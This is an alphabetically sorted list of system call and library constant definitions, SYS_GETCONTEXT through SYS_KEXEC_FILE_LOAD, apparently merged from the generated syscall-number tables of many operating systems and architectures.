SYS_GETCONTEXT                      = 0x430
SYS_GETCONTEXT               = 421 // { int getcontext(struct __ucontext 
SYS_GETCONTEXT           = 307 // { int
SYS_GETCPU                       = 302
SYS_GETCPU                       = 318
SYS_GETCPU                       = 345
SYS_GETCPU                       = 4312
SYS_GETCPU                  = 168
SYS_GETCPU                  = 302
SYS_GETCPU                  = 308
SYS_GETCPU                  = 309
SYS_GETCPU                  = 311
SYS_GETCPU                  = 5271
SYS_GETCWD                          = 0x193
SYS_GETCWD                       = 182
SYS_GETCWD                       = 183
SYS_GETCWD                       = 4203
SYS_GETCWD                  = 119
SYS_GETCWD                  = 17
SYS_GETCWD                  = 182
SYS_GETCWD                  = 183
SYS_GETCWD                  = 5077
SYS_GETCWD                  = 79
SYS_GETC_UNLOCKED                   = 0x8D6
SYS_GETDATE                         = 0x2A6
SYS_GETDATE64                       = 0xD4F
SYS_GETDENTS                     = 141
SYS_GETDENTS                     = 4141
SYS_GETDENTS                = 141
SYS_GETDENTS                = 174
SYS_GETDENTS                = 5076
SYS_GETDENTS                = 78
SYS_GETDENTS             = 390 // { int
SYS_GETDENTS64                   = 202
SYS_GETDENTS64                   = 217
SYS_GETDENTS64                   = 220
SYS_GETDENTS64                   = 4219
SYS_GETDENTS64              = 154
SYS_GETDENTS64              = 202
SYS_GETDENTS64              = 217
SYS_GETDENTS64              = 220
SYS_GETDENTS64              = 5308
SYS_GETDENTS64              = 61
SYS_GETDIRENTRIES                  = 196
SYS_GETDIRENTRIES64                = 344
SYS_GETDIRENTRIESATTR              = 222
SYS_GETDOMAINNAME           = 162
SYS_GETDTABLECOUNT = 18  // { int sys_getdtablecount(void)
SYS_GETDTABLESIZE                   = 0x304
SYS_GETDTABLESIZE                  = 89
SYS_GETDTABLESIZE            = 89  // { int getdtablesize(void)
SYS_GETDTABLESIZE          = 89  // { int getdtablesize(void)
SYS_GETEGID                         = 0x194
SYS_GETEGID                        = 43
SYS_GETEGID                      = 4050
SYS_GETEGID                      = 50
SYS_GETEGID                  = 43  // { gid_t getegid(void)
SYS_GETEGID                 = 108
SYS_GETEGID                 = 177
SYS_GETEGID                 = 202
SYS_GETEGID                 = 50
SYS_GETEGID                 = 5106
SYS_GETEGID                = 43  // { gid_t getegid(void)
SYS_GETEGID              = 43  // { gid_t
SYS_GETEGID        = 43  // { gid_t sys_getegid(void)
SYS_GETEGID32                    = 202
SYS_GETENTROPY                     = 500
SYS_GETENTROPY     = 7   // { int sys_getentropy(void 
SYS_GETENV                          = 0x24A
SYS_GETEUID                         = 0x195
SYS_GETEUID                        = 25
SYS_GETEUID                      = 4049
SYS_GETEUID                      = 49
SYS_GETEUID                  = 25  // { uid_t geteuid(void)
SYS_GETEUID                 = 107
SYS_GETEUID                 = 175
SYS_GETEUID                 = 201
SYS_GETEUID                 = 49
SYS_GETEUID                 = 5105
SYS_GETEUID                = 25  // { uid_t geteuid(void)
SYS_GETEUID              = 25  // { uid_t
SYS_GETEUID        = 25  // { uid_t sys_geteuid(void)
SYS_GETEUID32                    = 201
SYS_GETFH                          = 161
SYS_GETFH                    = 161 // { int getfh(char 
SYS_GETFH                  = 161 // { int getfh(char 
SYS_GETFH                = 395 // { int
SYS_GETFH          = 161 // { int sys_getfh(const char 
SYS_GETFSSTAT                      = 18
SYS_GETFSSTAT                = 395 // { int getfsstat(struct statfs 
SYS_GETFSSTAT              = 18  // { int getfsstat(struct statfs 
SYS_GETFSSTAT      = 62  // { int sys_getfsstat(struct statfs 
SYS_GETFSSTAT64                    = 347
SYS_GETFSSTAT_FREEBSD12     = 557 // { int getfsstat( 
SYS_GETGID                          = 0x196
SYS_GETGID                         = 47
SYS_GETGID                       = 4047
SYS_GETGID                       = 47
SYS_GETGID                   = 47  // { gid_t getgid(void)
SYS_GETGID                  = 104
SYS_GETGID                  = 176
SYS_GETGID                  = 200
SYS_GETGID                  = 47
SYS_GETGID                  = 5102
SYS_GETGID                 = 47  // { gid_t getgid(void)
SYS_GETGID               = 47  // { gid_t
SYS_GETGID         = 47  // { gid_t sys_getgid(void)
SYS_GETGID32                     = 200
SYS_GETGRENT                        = 0x283
SYS_GETGRGID                        = 0x197
SYS_GETGRGID_R                      = 0x5E7
SYS_GETGRNAM                        = 0x198
SYS_GETGRNAM_R                      = 0x5E8
SYS_GETGROUPS                       = 0x199
SYS_GETGROUPS                      = 79
SYS_GETGROUPS                    = 4080
SYS_GETGROUPS                    = 80
SYS_GETGROUPS               = 115
SYS_GETGROUPS               = 158
SYS_GETGROUPS               = 205
SYS_GETGROUPS               = 5113
SYS_GETGROUPS               = 79
SYS_GETGROUPS               = 80
SYS_GETGROUPS            = 79  // { int
SYS_GETGROUPS32                  = 205
SYS_GETGROUPSBYNAME                 = 0x1E2
SYS_GETHOSTBYADDR                   = 0x33D
SYS_GETHOSTBYADDR_R                 = 0x33C
SYS_GETHOSTBYNAME                   = 0x33F
SYS_GETHOSTBYNAME_R                 = 0x33E
SYS_GETHOSTENT                      = 0x340
SYS_GETHOSTID                       = 0x341
SYS_GETHOSTNAME                     = 0x342
SYS_GETHOSTUUID                    = 142
SYS_GETIBMOPT                       = 0x473
SYS_GETIBMSOCKOPT                   = 0x474
SYS_GETIFADDRS                      = 0xCE7
SYS_GETIPV4SOURCEFILTER             = 0xC77
SYS_GETITIMER                       = 0x273
SYS_GETITIMER                      = 86
SYS_GETITIMER                    = 105
SYS_GETITIMER                    = 4105
SYS_GETITIMER               = 102
SYS_GETITIMER               = 105
SYS_GETITIMER               = 36
SYS_GETITIMER               = 5035
SYS_GETITIMER               = 86
SYS_GETITIMER            = 426 // { int
SYS_GETLOGIN                        = 0x19A
SYS_GETLOGIN                       = 49
SYS_GETLOGIN                 = 49  // { int getlogin(char 
SYS_GETLOGIN               = 49  // { int getlogin(char 
SYS_GETLOGINCLASS            = 523 // { int getloginclass(char 
SYS_GETLOGIN_R                      = 0x5E9
SYS_GETLOGIN_R     = 141 // { int sys_getlogin_r(char 
SYS_GETLOGIN_UU                     = 0x332
SYS_GETMCCOLL                       = 0x16A
SYS_GETMSG                          = 0x429
SYS_GETNAMEINFO                     = 0x819
SYS_GETNETBYADDR                    = 0x343
SYS_GETNETBYNAME                    = 0x344
SYS_GETNETENT                       = 0x345
SYS_GETOPT                          = 0x29A
SYS_GETPAGESIZE                     = 0x2D8
SYS_GETPAGESIZE             = 64
SYS_GETPASS                         = 0x316
SYS_GETPEERNAME                     = 0x346
SYS_GETPEERNAME                    = 31
SYS_GETPEERNAME                  = 287
SYS_GETPEERNAME                  = 332
SYS_GETPEERNAME                  = 368
SYS_GETPEERNAME                  = 4171
SYS_GETPEERNAME             = 141
SYS_GETPEERNAME             = 205
SYS_GETPEERNAME             = 332
SYS_GETPEERNAME             = 368
SYS_GETPEERNAME             = 5051
SYS_GETPEERNAME             = 52
SYS_GETPEERNAME          = 31  // { int
SYS_GETPGID                         = 0x312
SYS_GETPGID                        = 151
SYS_GETPGID                      = 132
SYS_GETPGID                      = 4132
SYS_GETPGID                  = 207 // { int getpgid(pid_t pid)
SYS_GETPGID                 = 121
SYS_GETPGID                 = 132
SYS_GETPGID                 = 155
SYS_GETPGID                 = 224
SYS_GETPGID                 = 5119
SYS_GETPGID                = 207 // { int getpgid(pid_t pid)
SYS_GETPGID              = 207 // { pid_t
SYS_GETPGID        = 207 // { pid_t sys_getpgid(pid_t pid)
SYS_GETPGRP                         = 0x19C
SYS_GETPGRP                        = 81
SYS_GETPGRP                      = 4065
SYS_GETPGRP                      = 65
SYS_GETPGRP                  = 81  // { int getpgrp(void)
SYS_GETPGRP                 = 111
SYS_GETPGRP                 = 5109
SYS_GETPGRP                 = 65
SYS_GETPGRP                 = 81
SYS_GETPGRP                = 81  // { int getpgrp(void)
SYS_GETPGRP              = 81  // { int
SYS_GETPGRP        = 81  // { int sys_getpgrp(void)
SYS_GETPID                          = 0x19D
SYS_GETPID                         = 20
SYS_GETPID                       = 20
SYS_GETPID                       = 4020
SYS_GETPID                   = 20  // { pid_t getpid(void)
SYS_GETPID                  = 172
SYS_GETPID                  = 20
SYS_GETPID                  = 39
SYS_GETPID                  = 5038
SYS_GETPID                 = 20  // { pid_t getpid(void)
SYS_GETPID               = 20  // { pid_t
SYS_GETPID         = 20  // { pid_t sys_getpid(void)
SYS_GETPMSG                         = 0x42A
SYS_GETPMSG                      = 187
SYS_GETPMSG                      = 188
SYS_GETPMSG                      = 4208
SYS_GETPMSG                 = 181
SYS_GETPMSG                 = 187
SYS_GETPMSG                 = 188
SYS_GETPMSG                 = 5174
SYS_GETPPID                         = 0x19E
SYS_GETPPID                        = 39
SYS_GETPPID                      = 4064
SYS_GETPPID                      = 64
SYS_GETPPID                  = 39  // { pid_t getppid(void)
SYS_GETPPID                 = 110
SYS_GETPPID                 = 173
SYS_GETPPID                 = 197
SYS_GETPPID                 = 5108
SYS_GETPPID                 = 64
SYS_GETPPID                = 39  // { pid_t getppid(void)
SYS_GETPPID              = 39  // { pid_t
SYS_GETPPID        = 39  // { pid_t sys_getppid(void)
SYS_GETPRIORITY                     = 0x270
SYS_GETPRIORITY                    = 100
SYS_GETPRIORITY                  = 4096
SYS_GETPRIORITY                  = 96
SYS_GETPRIORITY             = 100
SYS_GETPRIORITY             = 140
SYS_GETPRIORITY             = 141
SYS_GETPRIORITY             = 5137
SYS_GETPRIORITY             = 96
SYS_GETPRIORITY          = 100 // { int
SYS_GETPROTOBYNAME                  = 0x347
SYS_GETPROTOBYNUMBER                = 0x348
SYS_GETPROTOENT                     = 0x349
SYS_GETPWENT                        = 0x286
SYS_GETPWNAM                        = 0x19F
SYS_GETPWNAM_R                      = 0x5EA
SYS_GETPWUID                        = 0x1A0
SYS_GETPWUID_R                      = 0x5EB
SYS_GETRANDOM                    = 355
SYS_GETRANDOM                    = 359
SYS_GETRANDOM                    = 384
SYS_GETRANDOM                    = 4353
SYS_GETRANDOM               = 278
SYS_GETRANDOM               = 318
SYS_GETRANDOM               = 347
SYS_GETRANDOM               = 349
SYS_GETRANDOM               = 359
SYS_GETRANDOM               = 5313
SYS_GETRANDOM              = 550 // { ssize_t getrandom(void 
SYS_GETRESGID                    = 170
SYS_GETRESGID                    = 171
SYS_GETRESGID                    = 4191
SYS_GETRESGID                = 361 // { int getresgid(gid_t 
SYS_GETRESGID               = 111
SYS_GETRESGID               = 120
SYS_GETRESGID               = 150
SYS_GETRESGID               = 170
SYS_GETRESGID               = 211
SYS_GETRESGID               = 5118
SYS_GETRESGID              = 361 // { int getresgid(gid_t 
SYS_GETRESGID      = 283 // { int sys_getresgid(gid_t 
SYS_GETRESGID32                  = 211
SYS_GETRESUID                    = 165
SYS_GETRESUID                    = 4186
SYS_GETRESUID                = 360 // { int getresuid(uid_t 
SYS_GETRESUID               = 109
SYS_GETRESUID               = 118
SYS_GETRESUID               = 148
SYS_GETRESUID               = 165
SYS_GETRESUID               = 209
SYS_GETRESUID               = 5116
SYS_GETRESUID              = 360 // { int getresuid(uid_t 
SYS_GETRESUID      = 281 // { int sys_getresuid(uid_t 
SYS_GETRESUID32                  = 209
SYS_GETRLIMIT                       = 0x292
SYS_GETRLIMIT                      = 194
SYS_GETRLIMIT                    = 4076
SYS_GETRLIMIT                    = 76
SYS_GETRLIMIT               = 144
SYS_GETRLIMIT               = 163
SYS_GETRLIMIT               = 191
SYS_GETRLIMIT               = 5095
SYS_GETRLIMIT               = 76
SYS_GETRLIMIT               = 97
SYS_GETRLIMIT            = 194 // { int
SYS_GETRTABLE      = 311 // { int sys_getrtable(void)
SYS_GETRUSAGE                       = 0x294
SYS_GETRUSAGE                      = 117
SYS_GETRUSAGE                    = 4077
SYS_GETRUSAGE                    = 77
SYS_GETRUSAGE               = 117
SYS_GETRUSAGE               = 165
SYS_GETRUSAGE               = 5096
SYS_GETRUSAGE               = 77
SYS_GETRUSAGE               = 98
SYS_GETRUSAGE            = 445 // { int
SYS_GETS                            = 0x07C
SYS_GETSERVBYNAME                   = 0x34A
SYS_GETSERVBYPORT                   = 0x34B
SYS_GETSERVENT                      = 0x34C
SYS_GETSGROUPS                     = 288
SYS_GETSID                          = 0x313
SYS_GETSID                         = 310
SYS_GETSID                       = 147
SYS_GETSID                       = 4151
SYS_GETSID                   = 310 // { int getsid(pid_t pid)
SYS_GETSID                  = 124
SYS_GETSID                  = 147
SYS_GETSID                  = 156
SYS_GETSID                  = 252
SYS_GETSID                  = 5122
SYS_GETSID                 = 310 // { int getsid(pid_t pid)
SYS_GETSID               = 286 // { pid_t
SYS_GETSID         = 255 // { pid_t sys_getsid(pid_t pid)
SYS_GETSOCKNAME                     = 0x34D
SYS_GETSOCKNAME                    = 32
SYS_GETSOCKNAME                  = 286
SYS_GETSOCKNAME                  = 331
SYS_GETSOCKNAME                  = 367
SYS_GETSOCKNAME                  = 4172
SYS_GETSOCKNAME             = 150
SYS_GETSOCKNAME             = 204
SYS_GETSOCKNAME             = 331
SYS_GETSOCKNAME             = 367
SYS_GETSOCKNAME             = 5050
SYS_GETSOCKNAME             = 51
SYS_GETSOCKNAME          = 32  // { int
SYS_GETSOCKOPT                      = 0x34E
SYS_GETSOCKOPT                     = 118
SYS_GETSOCKOPT                   = 295
SYS_GETSOCKOPT                   = 340
SYS_GETSOCKOPT                   = 365
SYS_GETSOCKOPT                   = 4173
SYS_GETSOCKOPT              = 118
SYS_GETSOCKOPT              = 209
SYS_GETSOCKOPT              = 340
SYS_GETSOCKOPT              = 365
SYS_GETSOCKOPT              = 5054
SYS_GETSOCKOPT              = 55
SYS_GETSOCKOPT           = 118 // { int
SYS_GETSOURCEFILTER                 = 0xC79
SYS_GETSTABLESIZE                   = 0x472
SYS_GETSUBOPT                       = 0x29D
SYS_GETSYNTX                        = 0x0FD
SYS_GETS_UNLOCKED                   = 0xC7D
SYS_GETTHRID       = 299 // { pid_t sys_getthrid(void)
SYS_GETTID                         = 286
SYS_GETTID                       = 207
SYS_GETTID                       = 224
SYS_GETTID                       = 4222
SYS_GETTID                  = 143
SYS_GETTID                  = 178
SYS_GETTID                  = 186
SYS_GETTID                  = 207
SYS_GETTID                  = 236
SYS_GETTID                  = 5178
SYS_GETTIMEOFDAY                    = 0x2F6
SYS_GETTIMEOFDAY                   = 116
SYS_GETTIMEOFDAY                 = 4078
SYS_GETTIMEOFDAY                 = 78
SYS_GETTIMEOFDAY             = 116 // { int gettimeofday(struct timeval 
SYS_GETTIMEOFDAY            = 116
SYS_GETTIMEOFDAY            = 169
SYS_GETTIMEOFDAY            = 5094
SYS_GETTIMEOFDAY            = 78
SYS_GETTIMEOFDAY            = 96
SYS_GETTIMEOFDAY           = 116 // { int gettimeofday(struct timeval 
SYS_GETTIMEOFDAY         = 418 // { int
SYS_GETTIMEOFDAY   = 67  // { int sys_gettimeofday(struct timeval 
SYS_GETTIMEOFDAY64                  = 0xD50
SYS_GETTIMEOFDAY_R                  = 0x32E
SYS_GETUID                          = 0x1A1
SYS_GETUID                         = 24
SYS_GETUID                       = 24
SYS_GETUID                       = 4024
SYS_GETUID                   = 24  // { uid_t getuid(void)
SYS_GETUID                  = 102
SYS_GETUID                  = 174
SYS_GETUID                  = 199
SYS_GETUID                  = 24
SYS_GETUID                  = 5100
SYS_GETUID                 = 24  // { uid_t getuid(void)
SYS_GETUID               = 24  // { uid_t
SYS_GETUID         = 24  // { uid_t sys_getuid(void)
SYS_GETUID32                     = 199
SYS_GETUTXENT                       = 0x2E0
SYS_GETUTXID                        = 0x2E2
SYS_GETUTXLINE                      = 0x2E3
SYS_GETVFSSTAT             = 503 // { int getvfsstat(struct statfs 
SYS_GETVFSSTAT           = 356 // { int
SYS_GETW                            = 0x319
SYS_GETWC                           = 0x140
SYS_GETWCHAR                        = 0x141
SYS_GETWCHAR_UNLOCKED               = 0xCBC
SYS_GETWC_UNLOCKED                  = 0xCBB
SYS_GETWD                           = 0x308
SYS_GETWGROUPS                     = 290
SYS_GETWMCCOLL                      = 0x16B
SYS_GETXATTR                       = 234
SYS_GETXATTR                     = 212
SYS_GETXATTR                     = 229
SYS_GETXATTR                     = 4227
SYS_GETXATTR                = 172
SYS_GETXATTR                = 191
SYS_GETXATTR                = 212
SYS_GETXATTR                = 227
SYS_GETXATTR                = 5183
SYS_GETXATTR                = 8
SYS_GETXATTR             = 378 // { int
SYS_GET_KERNEL_SYMS              = 130
SYS_GET_KERNEL_SYMS              = 4130
SYS_GET_KERNEL_SYMS         = 130
SYS_GET_KERNEL_SYMS         = 177
SYS_GET_KERNEL_SYMS         = 223
SYS_GET_KERNEL_SYMS         = 5170
SYS_GET_MEMPOLICY                = 260
SYS_GET_MEMPOLICY                = 275
SYS_GET_MEMPOLICY                = 320
SYS_GET_MEMPOLICY                = 4269
SYS_GET_MEMPOLICY           = 236
SYS_GET_MEMPOLICY           = 239
SYS_GET_MEMPOLICY           = 260
SYS_GET_MEMPOLICY           = 269
SYS_GET_MEMPOLICY           = 304
SYS_GET_MEMPOLICY           = 5228
SYS_GET_ROBUST_LIST              = 299
SYS_GET_ROBUST_LIST              = 312
SYS_GET_ROBUST_LIST              = 339
SYS_GET_ROBUST_LIST              = 4310
SYS_GET_ROBUST_LIST         = 100
SYS_GET_ROBUST_LIST         = 274
SYS_GET_ROBUST_LIST         = 299
SYS_GET_ROBUST_LIST         = 301
SYS_GET_ROBUST_LIST         = 305
SYS_GET_ROBUST_LIST         = 5269
SYS_GET_THREAD_AREA              = 244
SYS_GET_THREAD_AREA         = 211
SYS_GIVESOCKET                      = 0x475
SYS_GLOB                            = 0x31A
SYS_GLOBFREE                        = 0x31B
SYS_GMTIME                          = 0x0B0
SYS_GMTIME64                        = 0xCDC
SYS_GMTIME64_R                      = 0xCDD
SYS_GMTIME_R                        = 0x5E2
SYS_GRAB_PGO_DATA                  = 493
SYS_GRANTPT                         = 0x37A
SYS_GSSD_SYSCALL             = 505 // { int gssd_syscall(char 
SYS_GTTY                         = 32
SYS_GTTY                         = 4032
SYS_GTTY                    = 32
SYS_GUARDED_CLOSE_NP               = 442
SYS_GUARDED_KQUEUE_NP              = 443
SYS_GUARDED_OPEN_DPROTECTED_NP     = 484
SYS_GUARDED_OPEN_NP                = 441
SYS_GUARDED_PWRITE_NP              = 486
SYS_GUARDED_WRITEV_NP              = 487
SYS_GUARDED_WRITE_NP               = 485
SYS_HCREATE                         = 0x2C6
SYS_HDESTROY                        = 0x2C7
SYS_HSEARCH                         = 0x2C8
SYS_HYPOT                           = 0x02B
SYS_HYPOTD128                       = 0xBD1
SYS_HYPOTD32                        = 0xBCF
SYS_HYPOTD64                        = 0xBD0
SYS_HYPOTF                          = 0x883
SYS_HYPOTL                          = 0x884
SYS_IBMSFLUSH                       = 0x476
SYS_ICONV                           = 0x146
SYS_ICONV_CLOSE                     = 0x147
SYS_ICONV_OPEN                      = 0x145
SYS_IDENTITYSVC                    = 293
SYS_IDLE                         = 112
SYS_IDLE                         = 4112
SYS_IDLE                    = 112
SYS_IF_FREENAMEINDEX                = 0x817
SYS_IF_INDEXTONAME                  = 0x815
SYS_IF_NAMEINDEX                    = 0x816
SYS_IF_NAMETOINDEX                  = 0x814
SYS_ILOGB                           = 0x325
SYS_ILOGBD128                       = 0xBD4
SYS_ILOGBD32                        = 0xBD2
SYS_ILOGBD64                        = 0xBD3
SYS_ILOGBF                          = 0xA7E
SYS_ILOGBL                          = 0xA81
SYS_IMAXABS                         = 0x950
SYS_IMAXDIV                         = 0x951
SYS_IMPORTWO                        = 0x5A3
SYS_IMPORTWORKUNIT                  = 0x5A3
SYS_INDEX                           = 0x2BD
SYS_INET6_IS_SRCADDR                = 0xD5A
SYS_INET6_OPT_APPEND                = 0x962
SYS_INET6_OPT_FIND                  = 0x966
SYS_INET6_OPT_FINISH                = 0x963
SYS_INET6_OPT_GET_VAL               = 0x967
SYS_INET6_OPT_INIT                  = 0x961
SYS_INET6_OPT_NEXT                  = 0x965
SYS_INET6_OPT_SET_VAL               = 0x964
SYS_INET6_RTH_ADD                   = 0x95D
SYS_INET6_RTH_GETADDR               = 0x960
SYS_INET6_RTH_INIT                  = 0x95C
SYS_INET6_RTH_REVERSE               = 0x95E
SYS_INET6_RTH_SEGMENTS              = 0x95F
SYS_INET6_RTH_SPACE                 = 0x95B
SYS_INET_ADDR                       = 0x34F
SYS_INET_LNAOF                      = 0x350
SYS_INET_MAKEADDR                   = 0x351
SYS_INET_NETOF                      = 0x352
SYS_INET_NETWORK                    = 0x353
SYS_INET_NTOA                       = 0x354
SYS_INET_NTOP                       = 0x5D3
SYS_INET_PTON                       = 0x5D4
SYS_INITGROUPS                      = 0x218
SYS_INITGROUPS                     = 243
SYS_INITSTATE                       = 0x2C2
SYS_INIT_MODULE                  = 128
SYS_INIT_MODULE                  = 4128
SYS_INIT_MODULE             = 105
SYS_INIT_MODULE             = 128
SYS_INIT_MODULE             = 175
SYS_INIT_MODULE             = 190
SYS_INIT_MODULE             = 5168
SYS_INOTIFY_ADD_WATCH            = 276
SYS_INOTIFY_ADD_WATCH            = 292
SYS_INOTIFY_ADD_WATCH            = 317
SYS_INOTIFY_ADD_WATCH            = 4285
SYS_INOTIFY_ADD_WATCH       = 152
SYS_INOTIFY_ADD_WATCH       = 254
SYS_INOTIFY_ADD_WATCH       = 27
SYS_INOTIFY_ADD_WATCH       = 276
SYS_INOTIFY_ADD_WATCH       = 285
SYS_INOTIFY_ADD_WATCH       = 5244
SYS_INOTIFY_INIT                 = 275
SYS_INOTIFY_INIT                 = 291
SYS_INOTIFY_INIT                 = 316
SYS_INOTIFY_INIT                 = 4284
SYS_INOTIFY_INIT            = 151
SYS_INOTIFY_INIT            = 253
SYS_INOTIFY_INIT            = 275
SYS_INOTIFY_INIT            = 284
SYS_INOTIFY_INIT            = 5243
SYS_INOTIFY_INIT1                = 318
SYS_INOTIFY_INIT1                = 332
SYS_INOTIFY_INIT1                = 360
SYS_INOTIFY_INIT1                = 4329
SYS_INOTIFY_INIT1           = 26
SYS_INOTIFY_INIT1           = 294
SYS_INOTIFY_INIT1           = 318
SYS_INOTIFY_INIT1           = 322
SYS_INOTIFY_INIT1           = 324
SYS_INOTIFY_INIT1           = 5288
SYS_INOTIFY_RM_WATCH             = 277
SYS_INOTIFY_RM_WATCH             = 293
SYS_INOTIFY_RM_WATCH             = 318
SYS_INOTIFY_RM_WATCH             = 4286
SYS_INOTIFY_RM_WATCH        = 156
SYS_INOTIFY_RM_WATCH        = 255
SYS_INOTIFY_RM_WATCH        = 277
SYS_INOTIFY_RM_WATCH        = 28
SYS_INOTIFY_RM_WATCH        = 286
SYS_INOTIFY_RM_WATCH        = 5245
SYS_INSQUE                          = 0x2CF
SYS_INVALID                        = 63
SYS_IOCTL                           = 0x355
SYS_IOCTL                          = 54
SYS_IOCTL                        = 4054
SYS_IOCTL                        = 54
SYS_IOCTL                   = 16
SYS_IOCTL                   = 29
SYS_IOCTL                   = 5015
SYS_IOCTL                   = 54
SYS_IOCTL                = 54  // { int
SYS_IOPERM                       = 101
SYS_IOPERM                       = 4101
SYS_IOPERM                  = 101
SYS_IOPERM                  = 173
SYS_IOPL                         = 110
SYS_IOPL                         = 4110
SYS_IOPL                    = 110
SYS_IOPL                    = 172
SYS_IOPOLICYSYS                    = 322
SYS_IOPRIO_GET                   = 274
SYS_IOPRIO_GET                   = 290
SYS_IOPRIO_GET                   = 315
SYS_IOPRIO_GET                   = 4315
SYS_IOPRIO_GET              = 218
SYS_IOPRIO_GET              = 252
SYS_IOPRIO_GET              = 274
SYS_IOPRIO_GET              = 283
SYS_IOPRIO_GET              = 31
SYS_IOPRIO_GET              = 5274
SYS_IOPRIO_SET                   = 273
SYS_IOPRIO_SET                   = 289
SYS_IOPRIO_SET                   = 314
SYS_IOPRIO_SET                   = 4314
SYS_IOPRIO_SET              = 196
SYS_IOPRIO_SET              = 251
SYS_IOPRIO_SET              = 273
SYS_IOPRIO_SET              = 282
SYS_IOPRIO_SET              = 30
SYS_IOPRIO_SET              = 5273
SYS_IO_CANCEL                    = 231
SYS_IO_CANCEL                    = 247
SYS_IO_CANCEL                    = 249
SYS_IO_CANCEL                    = 4245
SYS_IO_CANCEL               = 210
SYS_IO_CANCEL               = 231
SYS_IO_CANCEL               = 247
SYS_IO_CANCEL               = 271
SYS_IO_CANCEL               = 3
SYS_IO_CANCEL               = 5204
SYS_IO_DESTROY                   = 228
SYS_IO_DESTROY                   = 244
SYS_IO_DESTROY                   = 246
SYS_IO_DESTROY                   = 4242
SYS_IO_DESTROY              = 1
SYS_IO_DESTROY              = 207
SYS_IO_DESTROY              = 228
SYS_IO_DESTROY              = 244
SYS_IO_DESTROY              = 269
SYS_IO_DESTROY              = 5201
SYS_IO_GETEVENTS                 = 229
SYS_IO_GETEVENTS                 = 245
SYS_IO_GETEVENTS                 = 247
SYS_IO_GETEVENTS                 = 4243
SYS_IO_GETEVENTS            = 208
SYS_IO_GETEVENTS            = 229
SYS_IO_GETEVENTS            = 245
SYS_IO_GETEVENTS            = 272
SYS_IO_GETEVENTS            = 4
SYS_IO_GETEVENTS            = 5202
SYS_IO_PGETEVENTS                = 385
SYS_IO_PGETEVENTS                = 388
SYS_IO_PGETEVENTS                = 399
SYS_IO_PGETEVENTS                = 4368
SYS_IO_PGETEVENTS           = 292
SYS_IO_PGETEVENTS           = 333
SYS_IO_PGETEVENTS           = 361
SYS_IO_PGETEVENTS           = 382
SYS_IO_PGETEVENTS           = 388
SYS_IO_PGETEVENTS           = 5328
SYS_IO_PGETEVENTS_TIME64         = 416
SYS_IO_PGETEVENTS_TIME64         = 4416
SYS_IO_SETUP                     = 227
SYS_IO_SETUP                     = 243
SYS_IO_SETUP                     = 245
SYS_IO_SETUP                     = 4241
SYS_IO_SETUP                = 0
SYS_IO_SETUP                = 206
SYS_IO_SETUP                = 227
SYS_IO_SETUP                = 243
SYS_IO_SETUP                = 268
SYS_IO_SETUP                = 5200
SYS_IO_SUBMIT                    = 230
SYS_IO_SUBMIT                    = 246
SYS_IO_SUBMIT                    = 248
SYS_IO_SUBMIT                    = 4244
SYS_IO_SUBMIT               = 2
SYS_IO_SUBMIT               = 209
SYS_IO_SUBMIT               = 230
SYS_IO_SUBMIT               = 246
SYS_IO_SUBMIT               = 270
SYS_IO_SUBMIT               = 5203
SYS_IO_URING_ENTER               = 426
SYS_IO_URING_ENTER               = 4426
SYS_IO_URING_ENTER          = 426
SYS_IO_URING_ENTER          = 5426
SYS_IO_URING_REGISTER            = 427
SYS_IO_URING_REGISTER            = 4427
SYS_IO_URING_REGISTER       = 427
SYS_IO_URING_REGISTER       = 5427
SYS_IO_URING_SETUP               = 425
SYS_IO_URING_SETUP               = 4425
SYS_IO_URING_SETUP          = 425
SYS_IO_URING_SETUP          = 5425
SYS_IPC                          = 117
SYS_IPC                          = 4117
SYS_IPC                     = 117
SYS_IPC                     = 215
SYS_ISALNUM                         = 0x031
SYS_ISALPHA                         = 0x030
SYS_ISASCII                         = 0x2ED
SYS_ISASTREAM                       = 0x42B
SYS_ISATTY                          = 0x1A3
SYS_ISBLANK                         = 0x0FE
SYS_ISCNTRL                         = 0x033
SYS_ISDIGIT                         = 0x034
SYS_ISGRAPH                         = 0x035
SYS_ISLOWER                         = 0x032
SYS_ISMCCOLLEL                      = 0x14C
SYS_ISNAN                           = 0x36D
SYS_ISPRINT                         = 0x037
SYS_ISPUNCT                         = 0x038
SYS_ISSETUGID                      = 327
SYS_ISSETUGID                = 253 // { int issetugid(void)
SYS_ISSETUGID              = 253 // { int issetugid(void)
SYS_ISSETUGID            = 305 // { int
SYS_ISSETUGID      = 253 // { int sys_issetugid(void)
SYS_ISSPACE                         = 0x039
SYS_ISUPPER                         = 0x036
SYS_ISWALNUM                        = 0x0FF
SYS_ISWALPHA                        = 0x100
SYS_ISWBLANK                        = 0x101
SYS_ISWCNTRL                        = 0x102
SYS_ISWCTYPE                        = 0x10C
SYS_ISWDIGIT                        = 0x103
SYS_ISWGRAPH                        = 0x104
SYS_ISWLOWER                        = 0x105
SYS_ISWPRINT                        = 0x106
SYS_ISWPUNCT                        = 0x107
SYS_ISWSPACE                        = 0x108
SYS_ISWUPPER                        = 0x109
SYS_ISWXDIGI                        = 0x10A
SYS_ISWXDIGIT                       = 0x10A
SYS_ISXDIGIT                        = 0x03B
SYS_J0                              = 0x026
SYS_J1                              = 0x023
SYS_JAIL                     = 338 // { int jail(struct jail 
SYS_JAIL                   = 338 // { int jail(struct jail 
SYS_JAIL_ATTACH              = 436 // { int jail_attach(int jid)
SYS_JAIL_ATTACH            = 471 // { int jail_attach(int jid)
SYS_JAIL_GET                 = 506 // { int jail_get(struct iovec 
SYS_JAIL_REMOVE              = 508 // { int jail_remove(int jid)
SYS_JAIL_SET                 = 507 // { int jail_set(struct iovec 
SYS_JN                              = 0x028
SYS_JOINWORK                        = 0x4B7
SYS_JOINWORKUNIT                    = 0x4B7
SYS_JRAND48                         = 0x2E6
SYS_KAS_INFO                       = 439
SYS_KBIND          = 86  // { int sys_kbind(const struct __kbind 
SYS_KCMP                         = 349
SYS_KCMP                         = 354
SYS_KCMP                         = 378
SYS_KCMP                         = 4347
SYS_KCMP                    = 272
SYS_KCMP                    = 312
SYS_KCMP                    = 341
SYS_KCMP                    = 343
SYS_KCMP                    = 354
SYS_KCMP                    = 5306
SYS_KDEBUG_TRACE                   = 180
SYS_KDEBUG_TRACE64                 = 179
SYS_KDEBUG_TRACE_STRING            = 178
SYS_KDEBUG_TYPEFILTER              = 177
SYS_KERN_FEATURES           = 340
SYS_KEVENT                         = 363
SYS_KEVENT               = 435 // { int
SYS_KEVENT64                       = 369
SYS_KEVENT_ID                      = 375
SYS_KEVENT_QOS                     = 374
SYS_KEXEC_FILE_LOAD              = 382
SYS_KEXEC_FILE_LOAD              = 401
